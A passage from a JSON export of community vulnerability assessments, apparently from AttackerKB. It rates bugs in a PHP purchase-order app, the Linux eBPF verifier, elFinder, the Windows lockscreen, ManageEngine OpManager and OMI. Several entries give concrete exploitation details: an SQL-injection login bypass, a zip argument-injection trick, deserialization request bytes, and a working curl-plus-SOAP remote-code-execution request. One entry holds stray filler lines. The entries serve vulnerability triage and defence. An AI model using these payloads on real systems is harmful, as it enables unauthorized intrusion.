          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "afe8c8ce-f69f-4c41-b6a3-8024e5297308",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "c5409ce1-48b8-4f5a-a3d1-af6008109157",
      "created": "2021-09-09T12:04:53.839273Z",
      "revisionDate": "2021-09-09T14:34:58.673737Z",
      "document": "## [CVE-nu11-09](https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html#comment-form)\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-09/docs/Capture.PNG)\r\n\r\n### Vulnerability Description:\r\nThe POMS-PHP (by: oretnom23 ) v1.0 is vulnerable to remote SQL-Injection-Bypass-Authentication for the admin account in app /purchase_order/classes/Login.php. \r\nremote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server, he can bypass the login credentials and take control of the admin account.\r\n\r\n### Vulnerability `PHP` code:\r\n\r\n```php\r\n\tpublic function login(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from users where username = '$username' and password = md5('$password') \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k) && $k != 'password'){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t$this->settings->set_userdata('login_type',1);\r\n\t\treturn json_encode(array('status'=>'success'));\r\n\t\t}else{\r\n\t\treturn json_encode(array('status'=>'incorrect','last_qry'=>\"SELECT * from users where username = '$username' and password = md5('$password') \"));\r\n\t\t}\r\n\t}\r\n ```\r\n## Responding from the hacked target:\r\n\r\n- - - `PoC + checks` = `PoC-CVE-nu11-09-rfth.py`\r\n\r\n```cmd\r\nC:\\Users\\venvaropt\\Desktop\\CVE-nu11-09-09092021>python PoC-CVE-nu11-09.py\r\n\r\nDevTools listening on ws://127.0.0.1:63704/devtools/browser/bf18be59-2361-4c08-82dc-689957d5bf9e\r\n\r\nThe payload for CVE-nu11-09 is deployed and your admin account is PWNED by SQL - Injection\r\n\r\nPlease see the screenshot poc.png to see if your exploit is working =) BR @nu11secur1ty\r\n\r\nThis target gives a positive <Response [200]> from inside, after bypassing the login :D\r\n\r\nC:\\Users\\venvaropt\\Desktop\\CVE-nu11-09-09092021>\r\n```\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-09/docs/responding-from-the-hacked-target.PNG)\r\n \r\n## Exploit technique:\r\n \r\n[Python](https://www.python.org/) + [Selenium](https://www.selenium.dev/) + hidden login && screenshot\r\n\r\n## Proof:\r\n[href](https://streamable.com/47kd87)\r\n \r\n## BR\r\n - - - @nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f02fc83f-010d-447c-ab97-0641839cc438",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "c2036ff1-9421-449c-9fd3-bbf73db5016c",
      "created": "2021-09-09T15:45:26.191351Z",
      "revisionDate": "2021-09-09T15:53:51.266968Z",
      "document": "So this is a pretty interesting bug in the Linux Kernel from versions 5.7.x to 5.13-rc4. It occurs due to `kernel/bpf/verifier.c` having a function named `adjust_scalar_min_max_vals` which is responsible for adjusting the minimum and maximum values an eBPF register can represent, which is used as part of eBPF bounds tracking of registers to make sure that when users submit eBPF programs for the kernel to run, they don't end up going out of bounds and leaking kernel memory or doing other nasty stuff.\r\n\r\n`adjust_scalar_min_max_vals` has a few switch statements for various types of operations, such as `BPF_AND`, `BPF_OR`, `BPF_SUB`, etc. For the purpose of this we will focus just on the AND vulnerability but the OR vulnerability was also introduced at the same time, and the `BPF_XOR` vulnerability was introduced with 5.10-rc1 of the Linux kernel.\r\n\r\nasdf\r\nasdf\r\nasdf\r\nasdf\r\nasdfasdfasdf\r\nasdf\r\nasdfasfd\r\nasdf\r\nasdfa\r\nsfasdf\r\nasdf\r\nadsf\r\nasfd\r\nasfd\r\nasdf\r\nasfdasfd\r\n\r\nI have rated the exploitation of this vulnerability as fairly difficult as whilst chompie1337 did push out a PoC for this bug which we have used to transform it into a Metasploit module, and this is fairly platform agnostic, the actual exploitation details involve a lot of fairly advanced concepts and many steps to get successful code execution to work.\r\n\r\nThat being said the value of this is high as pretty much any Linux system you can think of is going to have eBPF enabled unless they have explicitly disabled it via `sudo sysctl kernel.unprivileged_bpf_disabled=1` which will prevent unprivileged users from being able to load eBPF programs. This setting however is not default and will need to be applied to each affected machine so I'd imagine some people will either not be aware of this, or will end up deploying machines and forget that this setting needs to be set at some point, opening up the door for exploitation of this and similar issues.\r\n\r\nWhen executing `BPF_AND`'s switch code, as can be seen at https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L7575-L7579, Of particular note is the call to `scalar32_min_max_and` and the lines at https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L7083-L7093.\r\n\r\nIn this case the code will call `tnum_subreg_is_const(src_reg->var_off);` to check if the source register's lower 32 bits are known, and `tnum_subreg_is_const(dst_reg->var_off);` to check if the destination register's lower 32 bits are known. If both the source register's lower 32 bits are known and the destination register's lower 32 bits are known, then it assumes that `scalar64_min_max_and` will be called (it will) and that its safe to skip updating the registers for the known 32 bit values.\r\n\r\nHowever here lies a problem, as if we look at `scalar_min_max_and`, which is the official name for `scalar64_min_max_and`, we see something odd in its code at https://github.com/torvalds/linux/blob/c9e73e3d2b1eb1ea7ff068e05007eec3bd8ef1c9/kernel/bpf/verifier.c#L7116-L7127. Specifically it uses `tnum_is_const(src_reg->var_off);` and `tnum_is_const(dst_reg->var_off);` to determine if the full contents of the 64 bit source and destination registers are known. Only if the full 64 bit content of the registers are known, does it then mark the destination register as having a known value.\r\n\r\nThis leads to an edge case where if the operation involves registers where the upper 32 bits are unknown but the lower 32 bits are known, then we can make eBPF improperly verify the register as the 32 bit version of the call will assume the 64 bit  version of the call will have properly validated the register's contents, however in reality the register will not be verified since its upper 32 bits are still unknown.\r\n\r\nThe patch fixes this by ensuring that `scalar32_min_max_and` and related affected functions now call `__mark_reg32_known` on the destination register before returning if the lower 32 bits of the destination and source registers are known.  The contents of this function can be seen below:\r\n\r\n```\r\n/* Mark the unknown part of a register (variable offset or scalar  * value) as known to have the value @imm.\r\n*/\r\nstatic void __mark_reg32_known(struct bpf_reg_state *reg, u64 imm)\r\n{\r\n    reg->var_off = tnum_const_subreg(reg->var_off, imm);\r\n    reg->s32_min_value = (s32)imm;\r\n    reg->s32_max_value = (s32)imm;\r\n    reg->u32_min_value = (u32)imm;\r\n    reg->u32_max_value = (u32)imm;\r\n}\r\n```\r\n\r\nEssentially this code will  ensure that all the signed and unsigned minimum and maximum versions of the register are properly set, ensuring the correct bounds will be conserved when calling the final boundary updating functions are called to determine the 64 bit value, whereas before when calling the `__update_reg_bounds`, `__reg_deduce_bounds` and `__reg_bound_offset` functions within `adjust_scalar_min_max_vals`, a condition could occur whereby due to some internal logic on how to calculate these values, there could be a case where the bounds would be incorrectly determined.\r\n\r\nMore details on exactly how this is done can be found in the `The Vulnerability` section of chompie1337's excellent paper at https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story, but suffice to say its possible to make a register with a maximum 32 bit value of 0 and a minimum 32 bit value of 1, thereby severely messing up the logic of the bounds tracker.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "ba2ebb74-6b82-4a79-86e2-53e52fdd484b",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "9ad5c932-664b-45c3-a537-b1bfa45f73a5",
      "created": "2021-09-10T09:01:14.601242Z",
      "revisionDate": "2021-09-10T10:55:31.479172Z",
      "document": "## [CVE-nu11-10-09102021](https://www.sourcecodester.com/tutorial/14937/php-crud-without-refreshreload-using-ajax-and-datatables-tutorial)\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-10-09102021/docs/Capture.PNG)\r\n\r\n## [Vendor](https://www.sourcecodester.com/users/tips23)\r\n\r\n### Description:\r\nThe PHP CRUD (by: oretnom23 ) is vulnerable to XSS Stored Attack and remote SQL-Injection special characters. \r\nIn the application: ajax_crud the parameters, first_name, last_name, and email are vulnerable to XSS Stored attack!\r\nWhen the user will sending a malicious javascript payload, he can store a special character - string, onto the MySQL server. \r\nThe MySQL server can't read it because there have no prepared statements or the appropriate replacement/formatting rules \r\nin order to prevent SQL injection and the system will be down.\r\nStatus: CRITICAL\r\n\r\n## Documentation, HOW TO CHARACTER SET Statement:\r\n[href](https://dev.mysql.com/doc/refman/5.7/en/set-character-set.html)\r\n\r\n## Proof:\r\n[href](https://streamable.com/8n85yf)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "f98a3a95-edae-402a-b5b7-b07fd4589519",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "d0a70801-8f9f-4b7b-8403-397f684c2701",
      "created": "2021-09-10T18:47:11.1746Z",
      "revisionDate": "2021-09-27T16:01:56.801586Z",
      "document": "This CVE represents multiple vulnerabilities found in elFinder which you can read more about [here](https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities). My assessment will mostly focus on the argument injection vulnerability, as that one is personally the easiest to exploit / gives the best reward out of all of them from an attacker's perspective (a shell!).\r\n\r\nThe argument injection vulnerability occurs in the `makeArchive()` function:\r\n\r\n`php/elFinderVolumeDriver.class.php` from elFinder `v2.1.57`\r\n```\r\n6841     protected function makeArchive($dir, $files, $name, $arc)\r\n6842     {\r\n6843         if ($arc['cmd'] === 'phpfunction') {\r\n6844             if (is_callable($arc['argc'])) {\r\n6845                 call_user_func_array($arc['argc'], array($dir, $files, $name));\r\n6846             }\r\n6847         } else {\r\n6848             $cwd = getcwd();\r\n6849             if (chdir($dir)) {\r\n6850                 foreach ($files as $i => $file) {\r\n6851                     $files[$i] = '.' . DIRECTORY_SEPARATOR . basename($file);\r\n6852                 }\r\n6853                 $files = array_map('escapeshellarg', $files);\r\n6854 \r\n6855                 $cmd = $arc['cmd'] . ' ' . $arc['argc'] . ' ' . escapeshellarg($name) . ' ' . implode(' ', $files);\r\n6856                 $this->procExec($cmd, $o, $c);\r\n6857                 chdir($cwd);\r\n6858             } else {\r\n6859                 return false;\r\n6860             }\r\n6861         }\r\n6862         $path = $dir . DIRECTORY_SEPARATOR . $name;\r\n6863         return file_exists($path) ? $path : false;\r\n6864     }\r\n\r\n```\r\n\r\nOn line `6855`, the archive command is created with the previously-sanitized file name(s) and the user-controlled `name` variable being passed to `escapeshellarg()`. `escapeshellarg()` escapes single quotes and places singles quotes around the string supplied as the argument. Additionally, I found that the `name` variable is further sanitized via another method. Certain characters like spaces, slashes, `+`'s, etc. are either removed or replaced with other characters, adding some minor complexity to the exploit. Despite these limitations, when using `zip` as the archive method, supplying the `-TmTT` option through the `name` parameter / variable allows execution of arbitrary commands.\r\n\r\nThis vulnerability's impact can vary since elFinder can be used as a standalone web-based file manager and as an underlying file manager for other software. Standalone, elFinder does not require authentication, so exploitation would be quite straightforward. I don't expect there to be many of these installations on the open internet, so while easy to exploit, this would likely require being on an internal network first.\r\n\r\nIn cases where elFinder is integrated with other software, this may add to the complexity by requiring auth / admin privileges. For instance, according to the [Portswigger article](https://portswigger.net/daily-swig/critical-vulnerabilities-in-web-file-manager-elfinder-leave-servers-susceptible-to-takeover) elFinder is used as part of the Wordpress File Manager, but requires access to an admin account to exploit. This is likely the similar case for other software that integrates with elFinder, such as CKEditor, TinyMCE, etc.\r\n\r\nWhile it's hard to determine just how widespread this vulnerability is, I think most vulnerable elFinder installations are probably behind auth via third-party apps. Whether that's truly the case or not, a patch for this should be prioritized.\r\n\r\nEdit: I selected both unauthenticated and authenticated since this vulnerability can technically be both.",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "9a17f06a-fc33-4bfc-9f4e-40f21ca3a757",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "b9a135dc-994c-4633-b2b9-ab342128dd42",
      "created": "2021-09-14T19:58:15.751202Z",
      "revisionDate": "2021-09-27T16:01:50.475872Z",
      "document": "Contrary to what the title says this is not a elevation of privilege vulnerability. As noted at https://halove23.blogspot.com/2021/09/zdi-21-1053-bypassing-windows-lock.html and at https://www.zerodayinitiative.com/advisories/ZDI-21-1053/ this is actually an authentication bypass vulnerability that allows one to bypass the Windows lockscreen by taking advantage of a URL link within the page. \r\n\r\nThis link appears when one tries to log into an Microsoft connected account and hits the \"I Forgot My PIN\" link, attempts to sign in to a Microsoft account with an invalid password, hits the back link that appears at the top left of the page, then at the sign on page, hits the question mark icon that appears next to \"Sign in with a security key\", \r\n\r\nThis will display a dialog with the title \"Sign in with security key\" that has a URL link called \"Learn how to set this up\". Clicking on this link after enabling Narrator shows that this link actually opens an \"How do you want to open this?\" prompt. However this prompt is hidden which is why Narrator is used to tell us which elements we are hovered over.\r\n\r\nAs mentioned in https://halove23.blogspot.com/2021/09/zdi-21-1053-bypassing-windows-lock.html, this can then be used to open Edge, and then via Edge open the Settings window, at which point we can then open Explorer, and finally open a command window where we can execute arbitrary commands.\r\n\r\nThe risk of this vulnerability overall is still somewhat low. Due to the number of steps which must be taken using soely Narrator, unless someone automates the key presses (something that is entirely possible) you will still have to do a lot of listening and keypressing to get the vulnerability to work, and any one listening in to you attacking the PC will likely find it rather odd what you are doing.\r\n\r\nAdditionally you only gain privileges as a local user. This vulnerability does not grant you permissions as a administrative user or any privileged user on the system, and whilst you can use other EOP vulnerabilities that take advantage of the NT AUTHORITY\\Authenticated Users the user will be granted, you are still reliant on other EoP vulnerabilities not being patched on the target system for you to get SYSTEM level access.\r\n\r\nOverall this is a medium-low severity bug with a high degree of exploitability.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "e6a319f1-2386-4237-8026-30e9aa75bd6e",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "76c9f758-bf84-441c-90ad-dc4ff41ff54e",
      "created": "2021-09-14T20:02:24.352072Z",
      "revisionDate": "2021-09-14T21:07:05.878702Z",
      "document": "A deserialization vulnerability exists in the ManageEngine OpManager platform that can be leveraged by an unauthenticated attacker to execute code as the application user which is typically NT AUTHORITY\\SYSTEM on Windows and root on Linux.\r\n\r\nExploitation can be broken down into three high level steps.\r\n\r\n1. Issue an HTTP request to the application's page, to have an HTTP session cookie issued. For this purpose the login page works just fine.\r\n1. Issue a POST request to the `/servlets/com.adventnet.tools.sum.transport.SUMHandShakeServlet` resource with a body of `\\xac\\xed\\x00\\x05\\x77\\x04\\x00\\x00\\x03\\xea` which is 1002 serialized as a Java int. This command associates a handler to the HTTP session that is then exploited.\r\n1. Issue a POST request to the `/servlets/com.adventnet.tools.sum.transport.SUMCommunicationServlet` resource. The body of this request is the length in bytes of the serialized Java payload as a 32-bit unsigned, big endian value followed by the serialized Java payload.\r\n\r\nIn Ruby the POST body would be made like:\r\n```ruby\r\ndata = [ java_payload.length ].pack('N') + java_payload\r\n```\r\n\r\nStep 3 can be repeated multiple times to execute a different serialized Java payload to for example, execute multiple OS commands.\r\n\r\nThe default OpManager instance is vulnerable out of the box, there is no configuration necessary and a user never needs to have logged in. Technically, the HTTP request handler may fail in step 2 but it does so after the necessary request handler has been associated with the session, allowing exploitation to proceed regardless.\r\n\r\nA patched version (v12.5.233 and later) will not respond with a body starting with `\\xac\\ed\\x00\\x05` which can be used by an attacker to check for exploitability. The version number can also be found in the source of the login page by searching for paths beginning with `/cachestart/#####/` where `#####` is the 5-digit version number.\r\n\r\nA bypass for the patch issued by ManageEngine is identified as CVE-2021-3287.",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2fc5f512-73ae-4444-a7d6-53a2c3005f53",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "0802ecee-bb4c-4c5b-969c-32cb9808c281",
      "created": "2021-09-15T04:37:05.236516Z",
      "revisionDate": "2021-11-09T18:21:20.254463Z",
      "document": "RCE PoC using [`ExecuteScript`](https://github.com/microsoft/SCXcore#runas-provider-executescript) (multi-line shell script execution):\r\n\r\n```\r\nwvu@kharak:~/Downloads$ curl -vs http://127.0.0.1:5985/wsman -H \"Content-Type: application/soap+xml\" -d @payload.xml | xmllint --format -\r\n*   Trying 127.0.0.1...\r\n* TCP_NODELAY set\r\n* Connected to 127.0.0.1 (127.0.0.1) port 5985 (#0)\r\n> POST /wsman HTTP/1.1\r\n> Host: 127.0.0.1:5985\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Content-Type: application/soap+xml\r\n> Content-Length: 1679\r\n> Expect: 100-continue\r\n>\r\n* Done waiting for 100-continue\r\n} [1679 bytes data]\r\n* We are completely uploaded and fine\r\n< HTTP/1.1 200 OK\r\n< Content-Length: 1393\r\n< Connection: Keep-Alive\r\n< Content-Type: application/soap+xml;charset=UTF-8\r\n<\r\n{ [1393 bytes data]\r\n* Connection #0 to host 127.0.0.1 left intact\r\n* Closing connection 0\r\n<?xml version=\"1.0\"?>\r\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:wsa=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" xmlns:wsen=\"http://schemas.xmlsoap.org/ws/2004/09/enumeration\" xmlns:e=\"http://schemas.xmlsoap.org/ws/2004/08/eventing\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:wsmb=\"http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd\" xmlns:wsman=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" xmlns:wxf=\"http://schemas.xmlsoap.org/ws/2004/09/transfer\" xmlns:cim=\"http://schemas.dmtf.org/wbem/wscim/1/common\" xmlns:msftwinrm=\"http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd\" xmlns:wsmid=\"http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd\">\r\n  <SOAP-ENV:Header>\r\n    <wsa:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:To>\r\n    <wsa:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</wsa:Action>\r\n    <wsa:MessageID>uuid:19754ED3-CC01-0005-0000-000000010000</wsa:MessageID>\r\n    <wsa:RelatesTo>uuid:00B60932-CC01-0005-0000-000000010000</wsa:RelatesTo>\r\n  </SOAP-ENV:Header>\r\n  <SOAP-ENV:Body>\r\n    <p:SCX_OperatingSystem_OUTPUT xmlns:p=\"http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\">\r\n      <p:ReturnValue>TRUE</p:ReturnValue>\r\n      <p:ReturnCode>0</p:ReturnCode>\r\n      <p:StdOut>\r\nHello\r\nGoodbye\r\n</p:StdOut>\r\n      <p:StdErr/>\r\n    </p:SCX_OperatingSystem_OUTPUT>\r\n  </SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\nwvu@kharak:~/Downloads$\r\n```\r\n\r\n`payload.xml`:\r\n\r\n```xml\r\n<?xml version=\"1.0\"?>\r\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" xmlns:n=\"http://schemas.xmlsoap.org/ws/2004/09/enumeration\" xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema\" xmlns:h=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\" xmlns:p=\"http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd\">\r\n  <s:Header>\r\n    <a:To>HTTP://127.0.0.1:5985/wsman/</a:To>\r\n    <w:ResourceURI s:mustUnderstand=\"true\">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>\r\n    <a:ReplyTo>\r\n      <a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\r\n    </a:ReplyTo>\r\n    <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>\r\n    <w:MaxEnvelopeSize s:mustUnderstand=\"true\">102400</w:MaxEnvelopeSize>\r\n    <a:MessageID>uuid:00B60932-CC01-0005-0000-000000010000</a:MessageID>\r\n    <w:OperationTimeout>PT1M30S</w:OperationTimeout>\r\n    <w:Locale xml:lang=\"en-us\" s:mustUnderstand=\"false\"/>\r\n    <p:DataLocale xml:lang=\"en-us\" s:mustUnderstand=\"false\"/>\r\n    <w:OptionSet s:mustUnderstand=\"true\"/>\r\n    <w:SelectorSet>\r\n      <w:Selector Name=\"__cimnamespace\">root/scx</w:Selector>\r\n    </w:SelectorSet>\r\n  </s:Header>\r\n  <s:Body>\r\n    <p:ExecuteScript_INPUT xmlns:p=\"http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\">\r\n      <p:Script>ZWNobyAiIg0KZWNobyAiSGVsbG8iDQplY2hvICJHb29kYnllIg==</p:Script>\r\n      <p:Arguments/>\r\n      <p:timeout>0</p:timeout>\r\n      <p:b64encoded>true</p:b64encoded>\r\n    </p:ExecuteScript_INPUT>\r\n  </s:Body>\r\n</s:Envelope>\r\n```\r\n\r\n[More context...](https://twitter.com/wvuuuuuuuuuuuuu/status/1438002644228968452)",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "56aa3a81-f70f-4645-ae64-e74e536d219b",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "deb21742-f92b-4f5a-931c-082502383c34",
      "created": "2021-09-15T08:54:10.170622Z",
      "revisionDate": "2021-11-29T07:45:58.501876Z",
      "document": "Please see the [Rapid7 analysis](https://attackerkb.com/topics/DMSNq5zgcW/cve-2021-40539/rapid7-analysis).\r\n\r\n**Update:** I have confirmed that ADManager Plus was also patched against CVE-2021-40539. See the [release notes](https://www.manageengine.com/products/ad-manager/release-notes.html) for build 7112. This doesn't seem to affect `/RestAPI/WC` endpoints.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
